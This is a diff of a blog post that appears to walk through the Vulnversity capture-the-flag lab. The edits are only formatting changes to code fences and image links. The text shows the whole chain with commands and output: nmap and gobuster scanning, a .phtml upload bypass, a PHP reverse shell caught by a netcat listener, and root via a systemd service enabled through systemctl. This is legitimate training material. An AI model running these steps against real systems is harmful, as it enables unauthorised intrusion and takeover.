@@ -16,7 +16,7 @@ Our first task (after deploying the machine) is to use the port scanning utility
 
 We are instructed to use the ```-sV``` parameter, which will attempt to determine the version of the services running.
 
-```bash
+```
 downeg:vulnversity$ sudo nmap -sV 10.10.95.113
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 13:38 IST
 Nmap scan report for 10.10.95.113
@@ -43,7 +43,7 @@ nmap will also guess at the host OS depending on the software versions discovere
 The next task is to enumerate the directories on the web server running on port 3333 to see if there are any hidden directories.
 The tool to be used is [Gobuster](https://github.com/OJ/gobuster)
 
-```bash
+```
 downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333 -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
@@ -79,7 +79,7 @@ downeg:vulnversity$
 
 The task explicitly mentions finding only hidden directories, however if we wanted to expand on this search and enumerate files we can add the -x parameter and include the file extensions we are interested in locating. Note that this is not recursive and will only search in the URL path provided.
 
-```bash
+```
 downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333 -w /usr/share/wordlists/dirb/common.txt -x txt,php,htm,html
 ===============================================================
 Gobuster v3.1.0
@@ -133,7 +133,7 @@ There are other wordlists available with a larger scope. A popular one which is 
 
 The ```http://10.10.95.113:3333/internal/``` directory looks interesting, so we can enumerate further with Gobuster.
 
-```bash
+```
 downeg:vulnversity$ gobuster dir -u http://10.10.95.113:3333/internal/ -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
@@ -175,8 +175,8 @@ Using the hinted extension list ```php, php3, php4, php5, phtml``` we set our pa
 From this attack is seems that we can upload ```.phtml``` files as the response length is different.
 A quick test from the web page shows this to be true.
 
-PIC
-PIC
+![]({{site.baseurl}}/_assets/2021-07-14-12-00-22.png)
+![]({{site.baseurl}}/_assets/2021-07-14-12-00-22.png)
 
 The recommended reverse shell for this box is the [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) on GitHub.
 
@@ -186,7 +186,7 @@ With netcat listening on our local host on the configured port we can execute th
 
 We now have a reverse shell running on the server as the www-data user.
 
-```bash
+```
 downeg:vulnversity$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.14.12.41] from (UNKNOWN) [10.10.95.113] 43806
@@ -232,7 +232,7 @@ WantedBy=multi-user.target' > $PAYLOAD
 
 With the payload above typed carefully into our netcat reverse shell session it's time to try it.
 
-```bash
+```
 $ /bin/systemctl link $PAYLOAD
 Created symlink from /etc/systemd/system/tmp.JoBJldD8zM.service to /tmp/tmp.JoBJldD8zM.service.
 $ /bin/systemctl enable --now $PAYLOAD
@@ -245,7 +245,7 @@ $
 We now have a working POC showing that the id command was run as root.
 To capture the flag we can simply modify the ExecStart line of the payload to be ExecStart=/bin/sh -c "ls /root > /tmp/output" and this will provide us with the contents of the root user home directory.
 
-```bash
+```
 $ /bin/systemctl link $PAYLOAD                          
 Created symlink from /etc/systemd/system/tmp.5dMqFmEncd.service to /tmp/tmp.5dMqFmEncd.service.
 $ /bin/systemctl enable --now $PAYLOAD
@@ -257,3 +257,4 @@ $
 
 One final modification to the ExecStart line to cat the contents of that file to our output file and we have the root flag.
 
+![]({{site.baseurl}}/_assets/2021-07-14-12-00-22.png)
